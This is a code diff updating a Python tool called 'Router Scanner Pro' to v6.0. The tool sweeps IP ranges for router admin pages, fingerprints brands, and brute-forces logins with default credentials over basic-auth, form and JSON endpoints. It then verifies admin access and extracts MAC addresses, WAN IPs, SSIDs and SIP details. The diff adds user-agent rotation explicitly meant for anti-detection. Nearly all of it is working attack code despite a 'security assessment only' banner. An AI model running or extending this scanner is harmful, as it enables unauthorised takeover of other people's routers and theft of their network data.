@@ -1,10 +1,9 @@
 #!/usr/bin/env python3
 """
-Router Scanner Pro - Professional Network Security Tool
+Router Scanner Pro - Professional Network Security Tool v6.0
 Author: Network Security Engineer
 Cross-platform: Windows, Linux, macOS
-Live output with hacker theme
-Organized scanning with smart prioritization
+Advanced brand detection, false positive filtering, and admin verification
 """
 
 import os
@@ -69,11 +68,11 @@ def print_banner():
     banner = f"""
 {Colors.CYAN}{Colors.BOLD}
 ╔══════════════════════════════════════════════════════════════════════════════╗
-║                    ROUTER SCANNER PRO - v5.0                                ║
-║                    Organized Scanning & Smart Detection                      ║
+║                    ROUTER SCANNER PRO - v6.0                                ║
+║              Advanced Brand Detection & False Positive Filtering             ║
 ║                                                                              ║
-║  🔍 Smart Brand Detection  |  🔓 Priority-based Testing                    ║
-║  🚀 Organized Workflow     |  📊 Clean Professional Output                 ║
+║  🔍 Smart Brand Detection  |  🚫 False Positive Filtering                  ║
+║  🎯 Admin Verification     |  📊 Advanced Information Extraction            ║
 ╚══════════════════════════════════════════════════════════════════════════════╝
 {Colors.END}
 {Colors.YELLOW}                            [!] For Network Security Assessment Only [!]{Colors.END}
@@ -92,35 +91,104 @@ TARGET_CREDENTIALS = [
 # Common ports
 COMMON_PORTS = [80, 8080, 443, 8443, 8000, 8081, 8888, 8090, 9000, 9090]
 
-# Brand-specific login paths (Priority 1)
-BRAND_PATHS = {
-    'tp-link': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login'],
-    'huawei': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin'],
-    'zte': ['/login.gch', '/start.gch', '/getpage.gch', '/admin'],
-    'netgear': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin'],
-    'linksys': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login'],
-    'd-link': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin'],
-    'asus': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin'],
-    'fritzbox': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin'],
-    'generic': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html']
-}
-
-# Generic paths (Priority 2)
-GENERIC_PATHS = [
-    '/manager', '/control', '/config', '/settings', '/system',
-    '/dashboard', '/panel', '/console', '/interface'
+# User-Agent rotation for anti-detection
+USER_AGENTS = [
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
+    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15',
+    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0 Safari/537.36'
 ]
 
-# API paths (Priority 3)
-API_PATHS = [
-    '/api/login', '/api/auth', '/api/user/login', '/api/admin/login',
-    '/rest/login', '/rest/auth', '/rest/user/login',
-    '/json/login', '/json/auth', '/json/user/login'
+# False positive indicators (VPN, Email, Social login pages)
+FALSE_POSITIVE_INDICATORS = [
+    # VPN indicators
+    'vpn', 'openvpn', 'wireguard', 'ipsec', 'l2tp', 'pptp', 'fortinet', 'cisco anyconnect',
+    'nordvpn', 'expressvpn', 'surfshark', 'protonvpn', 'tunnelbear', 'cyberghost',
+    
+    # Email/Social indicators
+    'email', 'e-mail', 'gmail', 'yahoo', 'outlook', 'hotmail', 'mail',
+    'microsoft', 'google', 'facebook', 'twitter', 'instagram', 'social',
+    'cloud', 'office365', 'oauth', 'sso', 'single sign-on', 'account.live.com',
+    'accounts.google.com', 'login.live.com', 'facebook.com', 'twitter.com',
+    
+    # Other non-router indicators
+    'github', 'gitlab', 'bitbucket', 'slack', 'discord', 'telegram', 'whatsapp',
+    'zoom', 'teams', 'skype', 'dropbox', 'onedrive', 'icloud', 'aws', 'azure'
+]
+
+# Advanced brand detection patterns
+BRAND_PATTERNS = {
+    'tp-link': {
+        'content': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-', 'deco', 'omada'],
+        'headers': ['tp-link', 'tplink'],
+        'paths': ['/userRpm/LoginRpm.htm', '/cgi-bin/luci', '/admin', '/login', '/webpages/login.html'],
+        'models': ['TL-', 'Archer', 'Deco', 'Omada']
+    },
+    'huawei': {
+        'content': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247', 'HG8240H'],
+        'headers': ['huawei', 'HUAWEI'],
+        'paths': ['/html/index.html', '/asp/login.asp', '/login.cgi', '/admin', '/cgi-bin/webproc'],
+        'models': ['HG', 'B593', 'E5186', 'HG8245', 'HG8240', 'HG8247']
+    },
+    'zte': {
+        'content': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612'],
+        'headers': ['zte', 'ZTE'],
+        'paths': ['/login.gch', '/start.gch', '/getpage.gch', '/admin', '/cgi-bin/webproc'],
+        'models': ['ZXHN', 'MF28G', 'F660', 'F670L', 'F601', 'F609', 'F612']
+    },
+    'netgear': {
+        'content': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi'],
+        'headers': ['netgear', 'NETGEAR'],
+        'paths': ['/setup.cgi', '/genie.cgi', '/cgi-bin/', '/admin', '/login.htm'],
+        'models': ['WNDR', 'R7000', 'N600', 'WNR', 'AC', 'AX', 'Orbi']
+    },
+    'linksys': {
+        'content': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop'],
+        'headers': ['linksys', 'LINKSYS'],
+        'paths': ['/cgi-bin/webproc', '/cgi-bin/webif', '/admin', '/login', '/setup.cgi'],
+        'models': ['WRT', 'E1200', 'E2500', 'E3200', 'EA', 'Velop']
+    },
+    'd-link': {
+        'content': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-', 'DAP', 'DGS', 'DCS'],
+        'headers': ['d-link', 'D-LINK'],
+        'paths': ['/login.php', '/login.asp', '/cgi-bin/login', '/admin', '/login.htm'],
+        'models': ['DIR', 'DSL', 'DAP', 'DGS', 'DCS']
+    },
+    'asus': {
+        'content': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi', 'AiMesh'],
+        'headers': ['asus', 'ASUS'],
+        'paths': ['/Main_Login.asp', '/Advanced_System_Content.asp', '/admin', '/login.asp'],
+        'models': ['RT-', 'GT-', 'DSL-', 'RT-AC', 'RT-AX', 'ZenWiFi']
+    },
+    'fritzbox': {
+        'content': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box', 'FRITZ!Box'],
+        'headers': ['fritz', 'fritzbox', 'FRITZ', 'AVM'],
+        'paths': ['/cgi-bin/webcm', '/cgi-bin/firmwarecfg', '/admin', '/login.lua'],
+        'models': ['FRITZ!Box', 'FRITZ!Repeater', 'FRITZ!Powerline']
+    },
+    'generic': {
+        'content': [],
+        'headers': [],
+        'paths': ['/', '/admin', '/login', '/login.htm', '/admin.htm', '/index.html'],
+        'models': []
+    }
+}
+
+# Admin panel indicators
+ADMIN_INDICATORS = [
+    'dashboard', 'status', 'configuration', 'admin panel', 'control panel', 'welcome',
+    'logout', 'log out', 'system information', 'device status', 'main menu',
+    'router', 'gateway', 'modem', 'access point', 'network', 'wireless',
+    'lan', 'wan', 'dhcp', 'nat', 'firewall', 'port forwarding', 'qos',
+    'firmware', 'upgrade', 'backup', 'restore', 'reboot', 'restart'
 ]
 
 class RouterScannerPro:
-    def __init__(self, targets, threads=50, timeout=8):
-        self.targets = targets
+    def __init__(self, targets, threads=1, timeout=8):
+        self.targets = list(set(targets))  # Remove duplicates
         self.threads = threads
         self.timeout = timeout
         self.session = self.create_session()
@@ -133,8 +201,9 @@ class RouterScannerPro:
         session.mount("http://", adapter)
         session.mount("https://", adapter)
         
+        # Random User-Agent
         session.headers.update({
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+            'User-Agent': random.choice(USER_AGENTS),
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
             'Accept-Language': 'en-US,en;q=0.5',
             'Accept-Encoding': 'gzip, deflate',
@@ -159,46 +228,90 @@ class RouterScannerPro:
                 pass
         return open_ports
     
-    def detect_router_brand(self, ip, port):
-        """Detect router brand from main page"""
+    def detect_router_brand_advanced(self, ip, port):
+        """Advanced brand detection using multiple methods"""
         try:
             url = f"http://{ip}:{port}/"
-            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
-            content = response.text.lower()
-            headers = str(response.headers).lower()
             
-            # Brand detection patterns
-            brand_indicators = {
-                'tp-link': ['tp-link', 'tplink', 'TP-LINK', 'TPLINK', 'archer', 'TL-'],
-                'huawei': ['huawei', 'HUAWEI', 'HG', 'B593', 'E5186', 'HG8245'],
-                'zte': ['zte', 'ZTE', 'ZXHN', 'MF28G', 'F660', 'F670L'],
-                'netgear': ['netgear', 'NETGEAR', 'WNDR', 'R7000', 'N600', 'WNR'],
-                'linksys': ['linksys', 'LINKSYS', 'WRT', 'E1200', 'E2500', 'WRT'],
-                'd-link': ['d-link', 'D-LINK', 'DIR', 'DSL', 'DSL-'],
-                'asus': ['asus', 'ASUS', 'RT-', 'GT-', 'DSL-', 'RT-AC'],
-                'fritzbox': ['fritz', 'fritzbox', 'FRITZ', 'AVM', 'Fritz!Box']
-            }
+            # Try multiple User-Agents for better detection
+            for user_agent in random.sample(USER_AGENTS, 3):
+                try:
+                    headers = {'User-Agent': user_agent}
+                    response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
+                    
+                    if response.status_code == 200:
+                        content = response.text.lower()
+                        headers_str = str(response.headers).lower()
+                        
+                        # Check each brand
+                        for brand, patterns in BRAND_PATTERNS.items():
+                            if brand == 'generic':
+                                continue
+                                
+                            # Check content patterns
+                            content_matches = sum(1 for pattern in patterns['content'] if pattern.lower() in content)
+                            
+                            # Check header patterns
+                            header_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in headers_str)
+                            
+                            # Check server header
+                            server_header = response.headers.get('Server', '').lower()
+                            server_matches = sum(1 for pattern in patterns['headers'] if pattern.lower() in server_header)
+                            
+                            # If we have strong indicators, return this brand
+                            if content_matches >= 2 or header_matches >= 1 or server_matches >= 1:
+                                return brand, patterns
+                        
+                        # If no specific brand found, return generic
+                        return 'generic', BRAND_PATTERNS['generic']
+                        
+                except:
+                    continue
             
-            for brand, patterns in brand_indicators.items():
-                for pattern in patterns:
-                    if pattern.lower() in content or pattern.lower() in headers:
-                        return brand
-            
-            return 'generic'
+            return 'generic', BRAND_PATTERNS['generic']
             
         except:
-            return 'generic'
+            return 'generic', BRAND_PATTERNS['generic']
+    
+    def is_false_positive(self, content, url):
+        """Check if this is a false positive (VPN, Email, Social login)"""
+        content_lower = content.lower()
+        url_lower = url.lower()
+        
+        # Check for false positive indicators
+        for indicator in FALSE_POSITIVE_INDICATORS:
+            if indicator in content_lower or indicator in url_lower:
+                return True, indicator
+        
+        # Check for email-based login forms
+        if '<input' in content_lower and 'email' in content_lower:
+            return True, 'email-based login'
+        
+        # Check for social login buttons
+        social_indicators = ['facebook', 'google', 'twitter', 'microsoft', 'apple', 'github']
+        for social in social_indicators:
+            if social in content_lower:
+                return True, f'social login ({social})'
+        
+        return False, None
     
     def detect_authentication_type(self, url):
         """Detect authentication type for a specific URL"""
         try:
-            response = self.session.get(url, timeout=self.timeout, verify=False, allow_redirects=True)
+            # Use random User-Agent
+            headers = {'User-Agent': random.choice(USER_AGENTS)}
+            response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
             
             if response.status_code == 401:
                 return 'http_basic', response
             
             content = response.text.lower()
-            headers = str(response.headers).lower()
+            headers_str = str(response.headers).lower()
+            
+            # Check for false positives first
+            is_fp, fp_reason = self.is_false_positive(content, url)
+            if is_fp:
+                return f'false_positive_{fp_reason}', response
             
             # Check for login forms
             if '<form' in content and ('password' in content or 'username' in content):
@@ -209,7 +322,7 @@ class RouterScannerPro:
                 return 'api_based', response
             
             # Check for redirect patterns
-            if response.history or 'location' in headers:
+            if response.history or 'location' in headers_str:
                 return 'redirect_based', response
             
             return None, response
@@ -226,7 +339,7 @@ class RouterScannerPro:
             
             headers = {
                 'Authorization': f'Basic {encoded_credentials}',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                'User-Agent': random.choice(USER_AGENTS)
             }
             
             response = self.session.get(url, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
@@ -258,26 +371,24 @@ class RouterScannerPro:
             
             for form_data in form_data_variations:
                 try:
-                    response = self.session.post(url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
+                    headers = {'User-Agent': random.choice(USER_AGENTS)}
+                    response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
                     
                     if response.status_code == 200 and len(response.text) > 1000:
                         content = response.text.lower()
                         
-                        success_indicators = [
-                            'admin', 'management', 'configuration', 'settings',
-                            'logout', 'status', 'system', 'wireless', 'network',
-                            'dashboard', 'control panel', 'router', 'gateway'
-                        ]
+                        # Check for admin panel indicators
+                        admin_score = sum(1 for indicator in ADMIN_INDICATORS if indicator in content)
                         
+                        # Check for failure indicators
                         failure_indicators = [
                             'invalid', 'incorrect', 'failed', 'error', 'denied',
                             'wrong', 'login', 'authentication', 'access denied'
                         ]
+                        failure_score = sum(1 for indicator in failure_indicators if indicator in content)
                         
-                        success_count = sum(1 for indicator in success_indicators if indicator in content)
-                        failure_count = sum(1 for indicator in failure_indicators if indicator in content)
-                        
-                        if success_count > failure_count:
+                        # If admin score is higher than failure score, consider it successful
+                        if admin_score > failure_score and admin_score >= 3:
                             return True, response.url
                             
                 except:
@@ -303,7 +414,8 @@ class RouterScannerPro:
             
             headers = {
                 'Content-Type': 'application/json',
-                'Accept': 'application/json'
+                'Accept': 'application/json',
+                'User-Agent': random.choice(USER_AGENTS)
             }
             
             response = self.session.post(url, json=json_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
@@ -318,7 +430,8 @@ class RouterScannerPro:
             
             # Try form data
             form_data = {'username': username, 'password': password}
-            response = self.session.post(url, data=form_data, timeout=self.timeout, verify=False, allow_redirects=True)
+            headers = {'User-Agent': random.choice(USER_AGENTS)}
+            response = self.session.post(url, data=form_data, headers=headers, timeout=self.timeout, verify=False, allow_redirects=True)
             
             if response.status_code == 200 and len(response.text) > 100:
                 content = response.text.lower()
@@ -341,47 +454,102 @@ class RouterScannerPro:
         else:
             return self.test_form_based_auth(ip, port, path, username, password)
     
-    def extract_router_info(self, admin_url, username, password):
-        """Extract router information from admin page"""
-        info = {}
-        
+    def verify_admin_access(self, admin_url, username, password):
+        """Verify admin access and extract router information"""
         try:
             # Re-login to ensure session is active
             login_data = {'username': username, 'password': password}
-            self.session.post(admin_url, data=login_data, verify=False)
+            headers = {'User-Agent': random.choice(USER_AGENTS)}
+            self.session.post(admin_url, data=login_data, headers=headers, verify=False)
             
-            response = self.session.get(admin_url, verify=False)
-            content = response.text
+            # Get admin page
+            response = self.session.get(admin_url, headers=headers, verify=False)
+            content = response.text.lower()
             
-            # Extract information using regex patterns
-            info['firmware_version'] = self.extract_pattern(content, [
-                r'firmware[^:]*:?\s*([v\d\.]+)',
-                r'version[^:]*:?\s*([v\d\.]+)',
-                r'firmware.*?(\d+\.\d+\.\d+)'
-            ])
+            # Check for admin panel indicators
+            admin_score = sum(1 for indicator in ADMIN_INDICATORS if indicator in content)
             
-            info['model'] = self.extract_pattern(content, [
-                r'model[^:]*:?\s*([A-Z0-9\-]+)',
-                r'device[^:]*:?\s*([A-Z0-9\-]+)',
-                r'product[^:]*:?\s*([A-Z0-9\-]+)'
-            ])
-            
-            info['wan_ip'] = self.extract_pattern(content, [
-                r'wan.*?(\d+\.\d+\.\d+\.\d+)',
-                r'external.*?(\d+\.\d+\.\d+\.\d+)',
-                r'internet.*?(\d+\.\d+\.\d+\.\d+)'
-            ])
-            
-            info['ssid'] = self.extract_pattern(content, [
-                r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
-                r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
-                r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
-            ])
-            
-            return info
-            
+            if admin_score >= 3:
+                return True, self.extract_router_info(content)
+            else:
+                return False, {}
+                
         except:
-            return {}
+            return False, {}
+    
+    def extract_router_info(self, content):
+        """Extract comprehensive router information"""
+        info = {}
+        
+        # Extract MAC address
+        mac_patterns = [
+            r'mac[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
+            r'([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})',
+            r'physical.*?address[^:]*:?\s*([0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2}[:-][0-9a-f]{2})'
+        ]
+        info['mac_address'] = self.extract_pattern(content, mac_patterns)
+        
+        # Extract firmware version
+        firmware_patterns = [
+            r'firmware[^:]*:?\s*([v\d\.\-]+)',
+            r'version[^:]*:?\s*([v\d\.\-]+)',
+            r'firmware.*?(\d+\.\d+\.\d+)',
+            r'software[^:]*:?\s*([v\d\.\-]+)'
+        ]
+        info['firmware_version'] = self.extract_pattern(content, firmware_patterns)
+        
+        # Extract model
+        model_patterns = [
+            r'model[^:]*:?\s*([A-Z0-9\-_]+)',
+            r'device[^:]*:?\s*([A-Z0-9\-_]+)',
+            r'product[^:]*:?\s*([A-Z0-9\-_]+)',
+            r'type[^:]*:?\s*([A-Z0-9\-_]+)'
+        ]
+        info['model'] = self.extract_pattern(content, model_patterns)
+        
+        # Extract WAN IP
+        wan_ip_patterns = [
+            r'wan.*?(\d+\.\d+\.\d+\.\d+)',
+            r'external.*?(\d+\.\d+\.\d+\.\d+)',
+            r'internet.*?(\d+\.\d+\.\d+\.\d+)',
+            r'public.*?(\d+\.\d+\.\d+\.\d+)'
+        ]
+        info['wan_ip'] = self.extract_pattern(content, wan_ip_patterns)
+        
+        # Extract SSID
+        ssid_patterns = [
+            r'ssid[^:]*:?\s*([A-Za-z0-9\-_]+)',
+            r'network.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
+            r'wireless.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)',
+            r'wifi.*?name[^:]*:?\s*([A-Za-z0-9\-_]+)'
+        ]
+        info['ssid'] = self.extract_pattern(content, ssid_patterns)
+        
+        # Extract SIP information
+        sip_patterns = [
+            r'sip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
+            r'voip[^:]*:?\s*([A-Za-z0-9@\.\-_]+)',
+            r'phone[^:]*:?\s*([A-Za-z0-9@\.\-_]+)'
+        ]
+        info['sip_info'] = self.extract_pattern(content, sip_patterns)
+        
+        # Extract uptime
+        uptime_patterns = [
+            r'uptime[^:]*:?\s*([0-9]+[dhms\s]+)',
+            r'running[^:]*:?\s*([0-9]+[dhms\s]+)',
+            r'online[^:]*:?\s*([0-9]+[dhms\s]+)'
+        ]
+        info['uptime'] = self.extract_pattern(content, uptime_patterns)
+        
+        # Extract connection type
+        connection_patterns = [
+            r'connection[^:]*:?\s*([A-Za-z0-9\-_]+)',
+            r'type[^:]*:?\s*([A-Za-z0-9\-_]+)',
+            r'mode[^:]*:?\s*([A-Za-z0-9\-_]+)'
+        ]
+        info['connection_type'] = self.extract_pattern(content, connection_patterns)
+        
+        return info
     
     def extract_pattern(self, content, patterns):
         """Extract information using regex patterns"""
@@ -418,15 +586,12 @@ class RouterScannerPro:
                 if not running:
                     break
                 
-                # Detect brand from main page
-                brand = self.detect_router_brand(ip, port)
+                # Advanced brand detection
+                brand, brand_patterns = self.detect_router_brand_advanced(ip, port)
                 print(f"{Colors.BLUE}[*] Detected brand: {brand.upper()}{Colors.END}")
                 
                 # Get priority paths based on brand
-                if brand in BRAND_PATHS:
-                    priority_paths = BRAND_PATHS[brand] + BRAND_PATHS['generic']
-                else:
-                    priority_paths = BRAND_PATHS['generic'] + GENERIC_PATHS + API_PATHS
+                priority_paths = brand_patterns['paths'] + BRAND_PATTERNS['generic']['paths']
                 
                 # Test paths in priority order
                 login_found = False
@@ -437,7 +602,7 @@ class RouterScannerPro:
                     url = f"http://{ip}:{port}{path}"
                     auth_type, response = self.detect_authentication_type(url)
                     
-                    if auth_type:
+                    if auth_type and not auth_type.startswith('false_positive'):
                         print(f"{Colors.GREEN}[+] LOGIN PAGE FOUND: {url} ({auth_type}){Colors.END}")
                         
                         login_info = {
@@ -465,33 +630,42 @@ class RouterScannerPro:
                                 print(f"{Colors.RED}🔒 VULNERABLE: {username}:{password} works!{Colors.END}")
                                 print(f"{Colors.GREEN}[+] Admin URL: {admin_url}{Colors.END}")
                                 
-                                # Phase 4: Information extraction
-                                print(f"{Colors.YELLOW}[4/4] Information Extraction...{Colors.END}")
-                                router_info = self.extract_router_info(admin_url, username, password)
+                                # Phase 4: Admin verification and information extraction
+                                print(f"{Colors.YELLOW}[4/4] Admin Verification & Information Extraction...{Colors.END}")
                                 
-                                if router_info:
+                                verified, router_info = self.verify_admin_access(admin_url, username, password)
+                                
+                                if verified:
+                                    print(f"{Colors.GREEN}[+] Admin access verified!{Colors.END}")
+                                    
+                                    # Display extracted information
                                     for key, value in router_info.items():
                                         if value and value != "Unknown":
                                             print(f"{Colors.MAGENTA}[+] {key.replace('_', ' ').title()}: {value}{Colors.END}")
-                                
-                                vulnerability = {
-                                    'type': 'Default Credentials',
-                                    'credentials': f"{username}:{password}",
-                                    'admin_url': admin_url,
-                                    'auth_type': auth_type,
-                                    'router_info': router_info
-                                }
-                                result['vulnerabilities'].append(vulnerability)
-                                
-                                with self.lock:
-                                    stats['vulnerable_routers'] += 1
-                                
-                                break
+                                    
+                                    vulnerability = {
+                                        'type': 'Default Credentials',
+                                        'credentials': f"{username}:{password}",
+                                        'admin_url': admin_url,
+                                        'auth_type': auth_type,
+                                        'router_info': router_info,
+                                        'verified': True
+                                    }
+                                    result['vulnerabilities'].append(vulnerability)
+                                    
+                                    with self.lock:
+                                        stats['vulnerable_routers'] += 1
+                                    
+                                    break
+                                else:
+                                    print(f"{Colors.RED}[-] Admin access verification failed{Colors.END}")
                             else:
                                 print(f"{Colors.YELLOW}[-] {username}:{password} failed{Colors.END}")
                         
                         if not result['vulnerabilities']:
                             print(f"{Colors.RED}[-] No valid credentials found{Colors.END}")
+                    elif auth_type and auth_type.startswith('false_positive'):
+                        print(f"{Colors.YELLOW}[!] False positive detected: {auth_type.replace('false_positive_', '')}{Colors.END}")
             
             # Update stats
             with self.lock:
@@ -510,8 +684,8 @@ class RouterScannerPro:
         print(f"{Colors.GREEN}[+] Starting organized scan of {len(self.targets)} targets{Colors.END}")
         print(f"{Colors.YELLOW}[*] Target credentials: {', '.join([f'{u}:{p}' for u, p in TARGET_CREDENTIALS])}{Colors.END}")
         print(f"{Colors.CYAN}[*] Scanning ports: {', '.join(map(str, COMMON_PORTS))}{Colors.END}")
-        print(f"{Colors.BLUE}[*] Smart brand detection with priority-based testing{Colors.END}")
-        print(f"{Colors.MAGENTA}[*] Organized workflow: Ports → Brand → Login → Brute Force → Info{Colors.END}")
+        print(f"{Colors.BLUE}[*] Advanced brand detection with false positive filtering{Colors.END}")
+        print(f"{Colors.MAGENTA}[*] Organized workflow: Ports → Brand → Login → Brute Force → Admin Verification{Colors.END}")
         print("-" * 80)
         
         all_results = []
@@ -564,7 +738,7 @@ def parse_targets(target_input):
     return targets
 
 def main():
-    parser = argparse.ArgumentParser(description="Router Scanner Pro v5.0 - Organized Scanning & Smart Detection")
+    parser = argparse.ArgumentParser(description="Router Scanner Pro v6.0 - Advanced Brand Detection & False Positive Filtering")
     parser.add_argument('-t', '--targets', required=True, help='Target IP(s): single IP, CIDR, range, or file')
     parser.add_argument('-T', '--threads', type=int, default=1, help='Number of threads (default: 1 for organized output)')
     parser.add_argument('--timeout', type=int, default=8, help='Request timeout in seconds (default: 8)')
@@ -599,7 +773,7 @@ def main():
             print(f"  - Vulnerable routers: {stats['vulnerable_routers']}")
             print(f"  - Scan duration: {total_time:.1f} seconds")
             print(f"  - Average speed: {len(results)/total_time:.1f} targets/second")
-            print(f"{Colors.BLUE}[*] Organized workflow completed successfully{Colors.END}")
+            print(f"{Colors.BLUE}[*] Advanced detection and verification completed successfully{Colors.END}")
             
         else:
             print(f"{Colors.RED}[!] No results to report{Colors.END}")
